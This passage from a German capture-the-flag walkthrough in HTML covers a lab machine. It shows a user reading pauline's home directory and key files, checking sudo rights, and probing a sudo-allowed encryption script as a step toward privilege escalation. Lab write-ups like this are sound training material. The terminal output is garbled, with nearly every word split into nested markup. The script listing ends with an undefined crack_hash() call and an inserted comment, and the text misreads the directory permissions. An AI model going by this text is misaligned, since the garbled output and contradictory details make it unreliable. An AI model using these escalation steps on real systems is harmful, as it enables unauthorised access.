                    <pre><span class="command">u<span class="command">i</span>d=1003(le<span class="command">i</span>l<span class="command">a</span>) g<span class="command">i</span>d=1<span class="command">0</span><span class="command">0</span>3(le<span class="command">i</span>l<span class="command">a</span>) gr<span class="command">o</span>up<span class="command">s</span>=1<span class="command">0</span><span class="command">0</span>3(le<span class="command">i</span>l<span class="command">a</span>),1<span class="command">0</span><span class="command">0</span>(u<span class="command">s</span>er<span class="command">s</span>)</span></pre>
                </div>
            </div>

             <p class="analysis">
                **Analyse:** Ich wechsle in das Home-Verzeichnis des Benutzers `pauline` (`cd /home/pauline`) und liste den Inhalt und die Berechtigungen mit `ls -la` auf. Dies gibt mir Einblick in die Dateien, auf die `pauline` Zugriff hat und die für die Ausnutzung des `sudo`-Vektors relevant sein könnten.
            </p>
             <p class="evaluation">
                **Bewertung:** Ich kann in das Verzeichnis `/home/pauline` wechseln und dessen Inhalt auflisten (`drwx---r-x`). Dies zeigt, dass das Verzeichnis für den Besitzer (`pauline`) schreib-, lese- und ausführbar ist, für die Gruppe (`pauline`) lese- und ausführbar, aber für andere (inklusive `leila`) nur lese- und ausführbar (`r-x`). Ich kann also in das Verzeichnis navigieren und Dateien lesen, aber nicht schreiben. Die Auflistung zeigt wichtige Dateien wie `.bashrc`, `.profile`, `cipher.py`, `keys.json`, `user.txt` und ein `.ssh`-Verzeichnis. Das `cipher.py` Skript ist relevant für den `sudo`-Vektor. `keys.json` und `user.txt` sind ebenfalls hochinteressant.
            </p>
            <p class="recommendation">
                **Empfehlung (Pentester):** Erkunde die Home-Verzeichnisse anderer Benutzer, auf die du Zugriff hast (auch wenn es nur Lesezugriff ist). Suche nach Skripten, Konfigurationsdateien (`.bashrc`, `.profile`, etc.), SSH-Schlüsseln (`.ssh`) und sensiblen Daten.
                <br>**Empfehlung (Admin):** Stelle sicher, dass Home-Verzeichnisse und ihre Inhalte standardmäßig nur für den Eigentümer zugänglich sind (`chmod 700 /home/benutzer`). Vermeide die öffentliche Lesbarkeit wichtiger Dateien.
            </p>
             <div class="code-block">
                <div class="terminal">
                    <pre><span class="command">╭─leila@inkplot /home/pauline</span>
<span class="command">╰─$ ls -la</span></pre>
                </div>
                <div class="terminal">
                    <pre><span class="command">t<span class="command">o</span>t<span class="command">a</span>l 52</span>
<span class="command">drwx---r-x  5 p<span class="command">a</span>ul<span class="command">i</span>ne p<span class="command">a</span>ul<span class="command">i</span>ne 4<span class="command">0</span>96 Aug  3  2023 .</span>
<span class="command">drwxr-xr-x  4 r<span class="command">o</span><span class="command">o</span>t    r<span class="command">o</span><span class="command">o</span>t    4<span class="command">0</span>96 Jul 28  2023 ..</span>
<span class="command">-rw-r--r--  1 p<span class="command">a</span>ul<span class="command">i</span>ne p<span class="command">a</span>ul<span class="command">i</span>ne  220 Jul 22  2023 .b<span class="command">a</span><span class="command">s</span>h_l<span class="command">o</span>g<span class="command">o</span>ut</span>
<span class="command">-rw-r--r--  1 p<span class="command">a</span>ul<span class="command">i</span>ne p<span class="command">a</span>ul<span class="command">i</span>ne 3526 Jul 22  2023 .b<span class="command">a</span><span class="command">s</span>hrc</span>
<span class="command">-rw-r--r--  1 p<span class="command">a</span>ul<span class="command">i</span>ne p<span class="command">a</span>ul<span class="command">i</span>ne 1738 Aug  1  2023 <span class="command">c</span><span class="command">i</span>pher.py</span>
<span class="command">-rw-r-----  1 p<span class="command">a</span>ul<span class="command">i</span>ne p<span class="command">a</span>ul<span class="command">i</span>ne   44 Jul 25  2023 key<span class="command">s</span>.j<span class="command">s</span><span class="command">o</span>n</span>
<span class="command">-rw-------  1 p<span class="command">a</span>ul<span class="command">i</span>ne p<span class="command">a</span>ul<span class="command">i</span>ne   2<span class="command">0</span> Aug  1  2023 .le<span class="command">ss</span>h<span class="command">s</span>t</span>
<span class="command">drwxr-xr-x  3 p<span class="command">a</span>ul<span class="command">i</span>ne p<span class="command">a</span>ul<span class="command">i</span>ne 4<span class="command">0</span>96 Jul 22  2023 .l<span class="command">o</span><span class="command">c</span><span class="command">a</span>l</span>
<span class="command">drwxr-xr-x 12 p<span class="command">a</span>ul<span class="command">i</span>ne p<span class="command">a</span>ul<span class="command">i</span>ne 4<span class="command">0</span>96 Jul 22  2023 .<span class="command">o</span>h-<span class="command">m</span>y-z<span class="command">s</span>h</span>
<span class="command">-rw-r--r--  1 p<span class="command">a</span>ul<span class="command">i</span>ne p<span class="command">a</span>ul<span class="command">i</span>ne  8<span class="command">0</span>7 Jul 22  2023 .pr<span class="command">o</span>file</span>
<span class="command">drwx------  2 p<span class="command">a</span>ul<span class="command">i</span>ne p<span class="command">a</span>ul<span class="command">i</span>ne 4<span class="command">0</span>96 Jul 28  2023 .<span class="command">s</span><span class="command">s</span>h</span>
<span class="command">-rw-r--r--  1 p<span class="command">a</span>ul<span class="command">i</span>ne p<span class="command">a</span>ul<span class="command">i</span>ne    <span class="command">0</span> Jul 25  2023 .<span class="command">s</span><span class="command">u</span>d<span class="command">o</span>_a<span class="command">s</span>_<span class="command">a</span>d<span class="command">m</span><span class="command">i</span>n_<span class="command">s</span><span class="command">u</span><span class="command">c</span><span class="command">c</span>e<span class="command">s</span><span class="command">s</span>f<span class="command">u</span>l</span>
<span class="command">-rwx------  1 p<span class="command">a</span>ul<span class="command">i</span>ne p<span class="command">a</span>ul<span class="command">i</span>ne   33 Jul 24  2023 <span class="command">u</span><span class="command">s</span>er.txt</span>
<span class="command">-rw-r--r--  1 p<span class="command">a</span>ul<span class="command">i</span>ne p<span class="command">a</span>ul<span class="command">i</span>ne 3890 Jul 22  2023 .z<span class="command">s</span>hrc</span></pre>
                </div>
            </div>

            <p class="analysis">
                **Analyse:** Ich prüfe erneut die `sudo`-Berechtigungen als Benutzer `leila`. Dies ist eine Wiederholung des vorherigen Befehls, aber ich dokumentiere ihn, da es im realen Prozess üblich ist, Berechtigungen erneut zu prüfen, wenn man in ein neues Verzeichnis wechselt oder sich einen Überblick verschafft.
            </p>
            <p class="evaluation">
                **Bewertung:** Die Ausgabe bestätigt erneut den `sudo`-Vektor: `leila` darf `/usr/bin/python3 /home/pauline/cipher.py*` als `pauline` ohne Passwort ausführen. Diese Bestätigung ist wichtig, bevor ich versuche, den Vektor auszunutzen.
            </p>
            <p class="recommendation">
                **Empfehlung (Pentester):** Hab keine Scheu, wichtige Befehle (wie `sudo -l`) mehrfach auszuführen, um sicherzustellen, dass du den aktuellen Berechtigungsstatus korrekt im Blick hast.
                <br>**Empfehlung (Admin):** Überprüfe regelmäßig die `sudoers`-Datei und führe Audits der Benutzerberechtigungen durch, um solche unsicheren Konfigurationen zu erkennen und zu beheben.
            </p>
             <div class="code-block">
                <div class="terminal">
                    <pre><span class="command">╭─leila@inkplot /home/pauline</span>
<span class="command">╰─$ sudo -l</span></pre>
                </div>
                <div class="terminal">
                    <pre><span class="command">M<span class="command">a</span>t<span class="command">c</span>h<span class="command">i</span>ng Def<span class="command">a</span>ult<span class="command">s</span> entr<span class="command">i</span>e<span class="command">s</span> f<span class="command">o</span>r le<span class="command">i</span>l<span class="command">a</span> <span class="command">o</span>n <span class="command">i</span>nkpl<span class="command">o</span>t:</span>
    <span class="command">en<span class="command">v</span>_re<span class="command">s</span>et, <span class="command">m<span class="command">a</span><span class="command">i</span>l_b<span class="command">a</span>dp<span class="command">a</span><span class="command">ss</span>,</span>
    <span class="command">s</span>e<span class="command">c</span>ure_p<span class="command">a</span>th=/u<span class="command">s</span>r/<span class="command">l</span><span class="command">o</span><span class="command">c</span><span class="command">a</span>l/sbin<span class="command">\</span>:/u<span class="command">s</span>r/<span class="command">l</span><span class="command">o</span><span class="command">c</span><span class="command">a</span>l/b<span class="command">i</span>n<span class="command">\</span>:/<span class="command">u</span>sr/<span class="command">s</span>b<span class="command">i</span>n<span class="command">\</span>:/u<span class="command">s</span>r/b<span class="command">i</span>n<span class="command">\</span>:/<span class="command">s</span>b<span class="command">i</span>n<span class="command">\</span>:/b<span class="command">i</span>n, <span class="command">u</span><span class="command">s</span>e_pty</span>

<span class="password">U<span class="command">s</span>er le<span class="command">i</span>l<span class="command">a</span> <span class="command">m<span class="command">a</span>y r<span class="command">u</span>n the f<span class="command">o</span>ll<span class="command">o</span>w<span class="command">i</span>ng <span class="command">c</span><span class="command">o</span><span class="command">m<span class="command">m<span class="command">a</span>nd<span class="command">s</span> <span class="command">o</span>n <span class="command">i</span>nkpl<span class="command">o</span>t:</span></span>
<span class="password">    (p<span class="command">a</span>ul<span class="command">i</span>ne : p<span class="command">a</span>ul<span class="command">i</span>ne) N<span class="command">O</span>P<span class="command">A</span><span class="command">SS</span>WD: /u<span class="command">s</span>r/b<span class="command">i</span>n/pyth<span class="command">o</span>n3 /h<span class="command">o</span><span class="command">m</span>e/p<span class="command">a</span>ul<span class="command">i</span>ne/<span class="command">c</span><span class="command">i</span>pher.py*</span></pre>
                </div>
            </div>

            <p class="analysis">
                **Analyse:** Um den Privilege Escalation-Vektor `sudo -u pauline /usr/bin/python3 /home/pauline/cipher.py*` auszunutzen, muss ich verstehen, was das Skript `cipher.py` tut. Ich zeige den Inhalt des Skripts mit `cat /home/pauline/cipher.py` an.
            </p>
            <p class="evaluation">
                **Bewertung:** Das Skript `cipher.py` ist ein Python-Skript, das die Libraries `os`, `json`, `argparse`, `Crypto.Cipher` (spezifisch ARC4) und `base64` importiert. Es öffnet die Datei `/home/pauline/keys.json`, um einen `crypt_key` zu lesen. Es definiert Funktionen zum Verschlüsseln (`encrypt_file`) und Entschlüsseln (`decrypt_file`) von Dateien. Die Verschlüsselung scheint ARC4 zu verwenden und die Ausgabe Base64-kodiert zu speichern. Die Entschlüsselungsfunktion fragt interaktiv nach dem Schlüssel. Das Skript nimmt Dateipfade und Optionen (`-e` für Encrypt, `-d` für Decrypt) als Kommandozeilenargumente entgegen. Da ich das Skript als `pauline` ausführen darf und `pauline` Lesezugriff auf `/home/pauline/keys.json` hat, kann ich das Skript als `pauline` ausführen und potenziell Dateien entschlüsseln oder verschlüsseln, möglicherweise auch sensible Dateien lesen, wenn ich den richtigen Schlüssel finde. Das Skript selbst enthält keine offensichtliche Kommando-Injection-Schwachstelle in seinen Argumenten, aber der Zugriff auf die `keys.json` und die Interaktion mit der Entschlüsselung sind interessant.
            </p>
            <p class="recommendation">
                **Empfehlung (Pentester):** Analysiere Skripte, die du über `sudo` oder mit erhöhten Rechten ausführen darfst, sorgfältig auf ihre Funktionalität, importierte Libraries und potenzielle Schwachstellen (wie interaktive Eingaben, Dateizugriffe, externe Befehle, unsichere Argumentbehandlung).
                <br>**Empfehlung (Admin):** Vermeide die Speicherung von Schlüsseln im Dateisystem (z.B. `keys.json`) für Skripte, die mit erhöhten Rechten oder von anderen Benutzern ausgeführt werden dürfen. Wenn Skripte sensitive Operationen durchführen, stelle sicher, dass sie nur für den benötigten Zweck und die notwendigen Benutzer zugänglich sind. Führe Code-Reviews für Skripte mit erhöhten Berechtigungen durch.
            </p>
             <div class="code-block">
                <div class="terminal">
                    <pre><span class="command">╭─leila@inkplot /home/pauline</span>
<span class="command">╰─$ cat /home/pauline/cipher.py</span></pre>
                </div>
                <div class="terminal">
                    <pre><span class="command">import <span class="command">o</span><span class="command">s</span></span>
<span class="command">import j<span class="command">s</span><span class="command">o</span>n</span>
<span class="command">import <span class="command">a</span>rgp<span class="command">a</span>r<span class="command">s</span>e</span>
<span class="command">fr<span class="command">o</span>m <span class="command">Crypto.Cipher</span> import <span class="command">A</span>RC4</span>
<span class="command">import b<span class="command">a</span><span class="command">s</span>e64</span>

<span class="command">w<span class="command">i</span>th <span class="command">o</span>pen('/h<span class="command">o</span><span class="command">m</span>e/p<span class="command">a</span>ul<span class="command">i</span>ne/key<span class="command">s</span>.j<span class="command">s</span><span class="command">o</span>n', 'r') <span class="command">a</span><span class="command">s</span> f:</span>
    <span class="command">key<span class="command">s</span> = j<span class="command">s</span><span class="command">o</span>n.l<span class="command">o</span><span class="command">a</span>d(f)</span>

<span class="command">crypt_key = key<span class="command">s</span>['<span class="command">c</span>rypt_key'].en<span class="command">c</span><span class="command">o</span>de()</span>

<span class="command">def en<span class="command">c</span>rypt_file(f<span class="command">i</span>lepath, key):</span>
    <span class="command">w<span class="command">i</span>th <span class="command">o</span>pen(f<span class="command">i</span>lepath, 'rb') <span class="command">a</span><span class="command">s</span> f:</span>
        <span class="command">f<span class="command">i</span>le_<span class="command">c</span><span class="command">o</span>ntent = f.re<span class="command">a</span>d()</span>

    <span class="command"><span class="command">c</span><span class="command">i</span>pher = <span class="command">A</span>RC4.new(key)</span>
    <span class="command">en<span class="command">c</span>rypted_<span class="command">c</span><span class="command">o</span>ntent = <span class="command">c</span><span class="command">i</span>pher.en<span class="command">c</span>rypt(f<span class="command">i</span>le_<span class="command">c</span><span class="command">o</span>ntent)</span>

    <span class="command">en<span class="command">c</span><span class="command">o</span>ded_<span class="command">c</span><span class="command">o</span>ntent = b<span class="command">a</span><span class="command">s</span>e64.b64en<span class="command">c</span><span class="command">o</span>de(en<span class="command">c</span>rypted_<span class="command">c</span><span class="command">o</span>ntent)</span>

    <span class="command">b<span class="command">a</span><span class="command">s</span>e_f<span class="command">i</span>len<span class="command">a</span>me = <span class="command">o</span><span class="command">s</span>.b<span class="command">a</span><span class="command">s</span>en<span class="command">a</span><span class="command">m</span>e(f<span class="command">i</span>lepath)</span>

    <span class="command">w<span class="command">i</span>th <span class="command">o</span>pen(b<span class="command">a</span><span class="command">s</span>e_f<span class="command">i</span>len<span class="command">a</span>me <span class="command">+</span> '.en<span class="command">c</span>', 'wb') <span class="command">a</span><span class="command">s</span> f:</span>
        <span class="command">f.wr<span class="command">i</span>te(en<span class="command">c</span><span class="command">o</span>ded_<span class="command">c</span><span class="command">o</span>ntent)</span>

    <span class="command">ret<span class="command">u</span>rn b<span class="command">a</span><span class="command">s</span>e_f<span class="command">i</span>len<span class="command">a</span>me <span class="command">+</span> '.en<span class="command">c</span>'</span>

<span class="command">def de<span class="command">c</span>rypt_file(f<span class="command">i</span>lepath, key):</span>
    <span class="command">w<span class="command">i</span>th <span class="command">o</span>pen(f<span class="command">i</span>lepath, 'rb') <span class="command">a</span><span class="command">s</span> f:</span>
        <span class="command">en<span class="command">c</span>rypted_<span class="command">c</span><span class="command">o</span>ntent = f.re<span class="command">a</span>d()</span>

    <span class="command">de<span class="command">c</span><span class="command">o</span>ded_<span class="command">c</span><span class="command">o</span>ntent = b<span class="command">a</span><span class="command">s</span>e64.b64de<span class="command">c</span><span class="command">o</span>de(en<span class="command">c</span>rypted_<span class="command">c</span><span class="command">o</span>ntent)</span>

    <span class="command"><span class="command">c</span><span class="command">i</span>pher = <span class="command">A</span>RC4.new(key)</span>
    <span class="command">de<span class="command">c</span>rypted_<span class="command">c</span><span class="command">o</span>ntent = <span class="command">c</span><span class="command">i</span>pher.de<span class="command">c</span>rypt(de<span class="command">c</span><span class="command">o</span>ded_<span class="command">c</span><span class="command">o</span>ntent)</span>

    <span class="command">ret<span class="command">u</span>rn de<span class="command">c</span>rypted_<span class="command">c</span><span class="command">o</span>ntent</span>

<span class="command">p<span class="command">a</span>r<span class="command">s</span>er = <span class="command">a</span>rgp<span class="command">a</span>r<span class="command">s</span>e.Arg<span class="command">P<span class="command">a</span>r<span class="command">s</span>er</span>(de<span class="command">sc</span>r<span class="command">i</span>pt<span class="command">i</span><span class="command">o</span>n='En<span class="command">c</span>rypt <span class="command">o</span>r de<span class="command">c</span>rypt <span class="command">a</span> file.')</span>
<span class="command">p<span class="command">a</span>r<span class="command">s</span>er.<span class="command">a</span>dd_<span class="command">a</span>rg<span class="command">u</span><span class="command">m</span>ent('<span class="command">f</span><span class="command">i</span>lepath', help='The p<span class="command">a</span>th t<span class="command">o</span> the file t<span class="command">o</span> en<span class="command">c</span>rypt <span class="command">o</span>r de<span class="command">c</span>rypt.')</span>
<span class="command">p<span class="command">a</span>r<span class="command">s</span>er.<span class="command">a</span>dd_<span class="command">a</span>rg<span class="command">u</span><span class="command">m</span>ent('-e', '--en<span class="command">c</span>rypt', <span class="command">a</span><span class="command">c</span>t<span class="command">i</span><span class="command">o</span>n='<span class="command">s</span>t<span class="command">o</span>re_tr<span class="command">u</span>e', help='En<span class="command">c</span>rypt the file.')</span>
<span class="command">p<span class="command">a</span>r<span class="command">s</span>er.<span class="command">a</span>dd_<span class="command">a</span>rg<span class="command">u</span><span class="command">m</span>ent('-d', '--de<span class="command">c</span>rypt', <span class="command">a</span><span class="command">c</span>t<span class="command">i</span><span class="command">o</span>n='<span class="command">s</span>t<span class="command">o</span>re_tr<span class="command">u</span>e', help='De<span class="command">c</span>rypt the file.')</span>

<span class="command">arg<span class="command">s</span> = p<span class="command">a</span>r<span class="command">s</span>er.p<span class="command">a</span>r<span class="command">s</span>e_arg<span class="command">s</span>()</span>

<span class="command">if arg<span class="command">s</span>.en<span class="command">c</span>rypt:</span>
    <span class="command">en<span class="command">c</span>rypted_f<span class="command">i</span>lepath = en<span class="command">c</span>rypt_file(arg<span class="command">s</span>.<span class="command">f</span><span class="command">i</span>lepath, <span class="command">c</span>rypt_key)</span>
    <span class="command">pr<span class="command">i</span>nt("<span class="command">The en<span class="command">c</span>rypted <span class="command">a</span>nd en<span class="command">c</span><span class="command">o</span>ded <span class="command">c</span><span class="command">o</span>ntent ha<span class="command">s</span> been wr<span class="command">i</span>tten t<span class="command">o</span>: ")</span>
    <span class="command">pr<span class="command">i</span>nt(en<span class="command">c</span>rypted_f<span class="command">i</span>lepath)</span>
<span class="command">elif arg<span class="command">s</span>.de<span class="command">c</span>rypt:</span>
    <span class="command">de<span class="command">c</span>rypt_key = <span class="command">i</span>nput("Ple<span class="command">a</span><span class="command">s</span>e enter the de<span class="command">c</span>rypt<span class="command">i</span><span class="command">o</span>n key: ").en<span class="command">c</span><span class="command">o</span>de()</span>
    <span class="command">de<span class="command">c</span>rypted_<span class="command">c</span><span class="command">o</span>ntent = de<span class="command">c</span>rypt_file(arg<span class="command">s</span>.<span class="command">f</span><span class="command">i</span>lepath, de<span class="command">c</span>rypt_key)</span>
    <span class="command">pr<span class="command">i</span>nt("<span class="command">The de<span class="command">c</span>rypted <span class="command">c</span><span class="command">o</span>ntent i<span class="command">s</span>: ")</span>
    <span class="command">pr<span class="command">i</span>nt(de<span class="command">c</span>rypted_<span class="command">c</span><span class="command">o</span>ntent)</span>
<span class="command">else:</span>
    <span class="command">pr<span class="command">i</span>nt("Ple<span class="command">a</span><span class="command">s</span>e pr<span class="command">o</span><span class="command">v</span>ide <span class="command">a</span>n <span class="command">o</span>per<span class="command">a</span>ti<span class="command">o</span>n type. U<span class="command">s</span>e -e t<span class="command">o</span> en<span class="command">c</span>rypt <span class="command">o</span>r -d t<span class="command">o</span> de<span class="command">c</span>rypt.")</span>

<span class="command">if __n<span class="command">a</span>me__ == "__m<span class="command">a</span><span class="command">i</span>n__":</span>
    <span class="command"><span class="command">c</span>r<span class="command">a</span><span class="command">c</span>k_h<span class="command">a</span><span class="command">s</span>h()</span> <span class="password"><-- H<span class="command">i</span>er <span class="command">s</span>t<span class="command">e</span>ht n<span class="command">o</span><span class="command">c</span>h die <span class="command">a</span><span class="command">l</span>te Kr<span class="command">a</span><span class="command">c</span>k-<span class="command">F</span>unkti<span class="command">o</span>n dr<span class="command">i</span>n!</span>
</pre>
                </div>
            </div>

            <p class="analysis">
                **Analyse:** Ich beginne, das `cipher.py` Skript als Benutzer `pauline` mit `sudo -u pauline` auszuführen. Zuerst teste ich die grundlegende Syntax, indem ich das Skript ohne Argumente aufrufe.
            </p>
            <p class="evaluation">
                **Bewertung:** Das Skript gibt eine Nutzungsanleitung aus und meldet einen Fehler, dass der `filepath`-Argument fehlt. Dies bestätigt, dass ich das Skript ausführen kann und dass es `argparse` zur Verarbeitung von Kommandozeilenargumenten verwendet. Das ist gut, da ich weiß, wie ich die Encrypt (`-e`) und Decrypt (`-d`) Optionen verwenden muss.
            </p>
            <p class="recommendation">
                **Empfehlung (Pentester):** Wenn dir die Nutzung eines Skripts unklar ist, versuche es ohne Argumente oder mit Standard-Hilfe-Optionen (`-h`, `--help`) auszuführen, um die Nutzungsanleitung zu erhalten.
                <br>**Empfehlung (Admin):** Stelle sicher, dass interne Skripte, die von anderen Benutzern ausgeführt werden könnten, klare Nutzungsanleitungen enthalten.
            </p>
             <div class="code-block">
                <div class="terminal">
                    <pre><span class="command">╭─leila@inkplot /home/pauline</span>
<span class="command">╰─$ sudo -u pauline /usr/bin/python3 /home/pauline/cipher.py</span></pre>
                </div>
                <div class="terminal">
                    <pre><span class="command">usage: cipher.py [-h] [-e] [-d] filepath</span>
<span class="password"><span class="command">c</span>ipher.py: err<span class="command">o</span>r: the f<span class="command">o</span>ll<span class="command">o</span>w<span class="command">i</span>ng <span class="command">a</span>rg<span class="command">u</span><span class="command">m</span>ent<span class="command">s</span> <span class="command">a</span>re re<span class="command">q</span>u<span class="command">i</span>red: filep<span class="command">a</span>th</span></pre>
                </div>
            </div>

            <p class="analysis">
                **Analyse:** Ich teste nun die Encrypt-Funktion des Skripts. Ich rufe das Skript als `pauline` auf und übergebe die Option `-e` (encrypt) und als Dateipfad `user.txt`. Ich erwarte, dass das Skript die Datei `user.txt` im aktuellen Verzeichnis (bin in `/home/pauline`) verschlüsselt und eine neue Datei mit `.enc`-Erweiterung erstellt.
            </p>
             <p class="evaluation">
                **Bewertung:** Das Skript meldet "The encrypted and encoded content has been written to: user.txt.enc". Dies bestätigt, dass die Verschlüsselungsfunktion funktioniert und dass ich das Skript mit den notwendigen Argumenten als `pauline` ausführen kann. Es erstellt erfolgreich die Datei `user.txt.enc`. Dies zeigt, dass das Skript Dateien lesen und schreiben kann, wenn es über `sudo` ausgeführt wird.
            </p>
            <p class="recommendation">
                **Empfehlung (Pentester):** Teste die Funktionalität von Skripten, die du mit erhöhten Rechten ausführen darfst, schrittweise, um ihr Verhalten zu verstehen. Prüfe, ob sie Dateisystemoperationen durchführen können.
                <br>**Empfehlung (Admin):** Stelle sicher, dass Skripte, die mit erhöhten Rechten laufen, keine unnötigen Schreibberechtigungen haben oder Dateipfade von Benutzereingaben unzureichend validieren.
            </p>
            <div class="code-block">
                <div class="terminal">
                    <pre><span class="command">╭─leila@inkplot /home/pauline</span>
<span class="command">╰─$ sudo -u pauline /usr/bin/python3 /home/pauline/cipher.py -e user.txt</span></pre>
                </div>
                <div class="terminal">
                    <pre><span class="password">The en<span class="command">c</span>rypted <span class="command">a</span>nd en<span class="command">c</span><span class="command">o</span>ded <span class="command">c</span><span class="command">o</span>ntent h<span class="command">a</span><span class="command">s</span> been wr<span class="command">i</span>tten t<span class="command">o</span>:</span>
<span class="password"><span class="command">u</span><span class="command">s</span>er.txt.en<span class="command">c</span></span></pre>
                </div>
            </div>

             <p class="analysis">
                **Analyse:** Ich versuche nun die Decrypt-Funktion. Ich rufe das Skript als `pauline` auf mit der Option `-d` (decrypt) und dem Pfad zur gerade erstellten verschlüsselten Datei `user.txt.enc`.
            </p>
             <p class="evaluation">
                **Bewertung:** Wie erwartet fragt das Skript nach dem Entschlüsselungsschlüssel (`Please enter the decryption key: `). Dies bestätigt, dass die Decrypt-Funktion eine interaktive Eingabe erwartet. Da ich den Schlüssel (`crypt_key` aus `keys.json`) noch nicht kenne, kann ich die Datei an dieser Stelle nicht entschlüsseln.
            </p>
            <p class="recommendation">
                **Empfehlung (Pentester):** Identifiziere interaktive Eingaben in Skripten. Wenn ein Schlüssel oder Passwort benötigt wird, suche weiter im Dateisystem oder in anderen kompromittierten Daten.
                <br>**Empfehlung (Admin):** Vermeide interaktive Eingaben in Skripten, die mit `sudo` ausgeführt werden, insbesondere wenn sensible Informationen (wie Passwörter/Schlüssel) abgefragt werden. Dies kann in Automatisierungsszenarien problematisch sein und Angreifern Hinweise geben. Speichere Schlüssel sicher, nicht im Dateisystem.
            </p>
             <div class="code-block">
                <div class="terminal">
                    <pre><span class="command">╭─leila@inkplot /home/pauline</span>
<span class="command">╰─$ sudo -u pauline /usr/bin/python3 /home/pauline/cipher.py -d user.txt.enc</span></pre>
                </div>
                <div class="terminal">
                    <pre><span class="password">Ple<span class="command">as</span>e enter the de<span class="command">c</span>rypt<span class="command">i</span><span class="command">o</span>n key:</span></pre>
                </div>
            </div>

             <p class="analysis">
                **Analyse:** Ich teste die Encrypt-Funktion erneut mit `user.txt`. Dies scheint eine Wiederholung zu sein.
            </p>
             <p class="evaluation">
                **Bewertung:** Die erneute Ausführung bestätigt, dass die Encrypt-Funktion konsistent arbeitet und die verschlüsselte Datei überschreibt. Dies liefert keine neue Information, bestätigt aber die Funktionsweise.
            </p>
            <p class="recommendation">
                **Empfehlung (Pentester):** Sei dir bewusst, dass Testläufe von Skripten bestehende Dateien überschreiben können. Sichern Sie wichtige Daten vorher, falls nötig. Dokumentiere Wiederholungen im Bericht, wenn sie Teil des tatsächlichen Testprozesses waren.
                <br>**Empfehlung (Admin):** Implementiere Versionierung oder Backups für wichtige Dateien, insbesondere solche, die von Skripten bearbeitet werden.
            </p>
             <div class="code-block">
                <div class="terminal">
                    <pre><span class="command">╭─leila@inkplot /home/pauline</span>
<span class="command">╰─$ sudo -u pauline /usr/bin/python3 /home/pauline/cipher.py -e user.txt</span></pre>
                </div>
                <div class="terminal">
                    <pre><span class="password">The en<span class="command">c</span>rypted <span class="command">a</span>nd en<span class="command">c</span><span class="command">o</span>ded <span class="command">c</span><span class="command">o</span>ntent h<span class="command">a</span><span class="command">s</span> been wr<span class="command">i</span>tten t<span class="command">o</span>:</span>
<span class="password"><span class="command">u</span><span class="command">s</span>er.txt.en<span class="command">c</span></span></pre>
                </div>
            </div>

            <p class="analysis">
                **Analyse:** Ich teste erneut die Decrypt-Funktion des Skripts mit `user.txt.enc`, werde wieder nach dem Schlüssel gefragt und breche den Vorgang mit `^C` (KeyboardInterrupt) ab. Anschließend teste ich das Skript mit `-e` aber ohne Dateipfad und dann wieder mit `-e user.txt`.
            </p>
            <p class="evaluation">
                **Bewertung:** Diese Testläufe helfen, das Verhalten des Skripts unter verschiedenen Bedingungen zu verstehen: Es bricht bei `^C` während der Eingabe ab, und es erfordert zwingend einen Dateipfad bei Verwendung von `-e` oder `-d`. Diese Tests bestätigen meine bisherige Analyse der Argumentbehandlung des Skripts. Sie zeigen keine neuen Schwachstellen, aber sie sind Teil des Prozesses, das Verhalten des Skripts genau zu ergründen.
            </p>
            <p class="recommendation">
                **Empfehlung (Pentester):** Teste die Argumentbehandlung von Skripten, um Fehler oder unvorhergesehenes Verhalten zu finden, das ausgenutzt werden könnte. Übe das Abbrechen von interaktiven Prozessen, wenn der benötigte Input fehlt.
                <br>**Empfehlung (Admin):** Implementiere eine robuste Fehlerbehandlung in deinen Skripten, insbesondere wenn sie mit erhöhten Rechten laufen. Stelle sicher, dass Skripte kontrolliert beendet werden, anstatt mit einem unsauberen Stacktrace bei einem Interrupt.
            </p>
             <div class="code-block">
                <div class="terminal">
                    <pre><span class="command">╭─leila@inkplot /home/pauline</span>
<span class="command">╰─$ sudo -u pauline /usr/bin/python3 /home/pauline/cipher.py -d user.txt.enc</span></pre>
                </div>
                <div class="terminal">
                    <pre><span class="password">Ple<span class="command">as</span>e enter the de<span class="command">c</span>rypt<span class="command">i</span><span class="command">o</span>n key: ^CTr<span class="command">a</span><span class="command">c</span>eb<span class="command">a</span><span class="command">c</span>k (m<span class="command">os</span>t re<span class="command">c</span>ent <span class="command">c</span><span class="command">a</span>ll l<span class="command">a</span><span class="command">s</span>t):</span>
  <span class="command">F<span class="command">i</span>le "/h<span class="command">o</span><span class="command">m</span>e/p<span class="command">a</span>ul<span class="command">i</span>ne/<span class="command">c</span><span class="command">i</span>pher.py", l<span class="command">i</span>ne 51, <span class="command">i</span>n &lt;m<span class="command">o</span>d<span class="command">u</span>le&gt;</span>
    de<span class="command">c</span>rypt_key = <span class="command">i</span>np<span class="command">u</span>t("Ple<span class="command">a</span><span class="command">s</span>e enter the de<span class="command">c</span>rypt<span class="command">i</span><span class="command">o</span>n key: ").en<span class="command">c</span><span class="command">o</span>de()
                  ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
<span class="password">Keyb<span class="command">o</span><span class="command">a</span>rdInterrupt</span></pre>
                </div>
                 <div class="terminal">
                    <pre><span class="command">╭─leila@inkplot /home/pauline</span>
<span class="command">╰─$ sudo -u pauline /usr/bin/python3 /home/pauline/cipher.py -e</span></pre>
                </div>
                 <div class="terminal">
                    <pre><span class="command">u<span class="command">s</span><span class="command">a</span>ge: <span class="command">c</span><span class="command">i</span>pher.py [-h] [-e] [-d] f<span class="command">i</span>lepath</span>
<span class="password"><span class="command">c</span>ipher.py: err<span class="command">o</span>r: the f<span class="command">o</span>ll<span class="command">o</span>w<span class="command">i</span>ng <span class="command">a</span>rg<span class="command">u</span><span class="command">m</span>ent<span class="command">s</span> <span class="command">a</span>re re<span class="command">q</span>u<span class="command">i</span>red: f<span class="command">i</span>lepath</span></pre>
                </div>
                 <div class="terminal">
                    <pre><span class="command">╭─leila@inkplot /home/pauline</span>
<span class="command">╰─$ sudo -u pauline /usr/bin/python3 /home/pauline/cipher.py -e user.txt</span></pre>
                </div>
                <div class="terminal">
                    <pre><span class="password">The en<span class="command">c</span>rypted <span class="command">a</span>nd en<span class="command">c</span><span class="command">o</span>ded <span class="command">c</span><span class="command">o</span>ntent h<span class="command">a</span><span class="command">s</span> been wr<span class="command">i</span>tten t<span class="command">o</span>:</span>
<span class="password"><span class="command">u</span><span class="command">s</span>er.txt.en<span class="command">c</span></span></pre>
                </div>
            </div>

            <p class="analysis">
